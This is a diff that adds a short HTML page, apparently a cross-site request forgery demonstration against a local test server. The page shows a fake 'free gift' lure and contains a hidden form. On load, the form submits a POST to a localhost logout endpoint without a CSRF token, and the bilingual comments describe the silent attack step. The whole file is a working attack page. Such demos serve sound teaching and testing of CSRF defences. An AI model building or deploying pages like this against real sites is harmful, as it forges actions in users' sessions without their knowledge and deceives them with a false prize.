@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Gift Page</title>
+    </head>
+    <body>
+        <h1>Congratulations! You won a free gift!</h1>
+        <p>Redirecting to details page, please wait...</p>
+
+        <!-- 사용자 몰래 우리 서버로 POST 요청을 보내는 숨겨진 폼 (Hidden form to silently send POST request to victim server) -->
+        <form
+            action="https://localhost:9090/logout"
+            method="POST"
+            id="csrfForm"
+        >
+            <!-- 토큰은 전혀 포함되어 있지 않습니다 (No CSRF token included here) -->
+        </form>
+
+        <script>
+            // 페이지 로드 즉시 자동으로 폼을 전송 (Automatically submit the form immediately upon page load)
+            window.onload = function () {
+                document.getElementById("csrfForm").submit();
+            };
+        </script>
+    </body>
+</html>
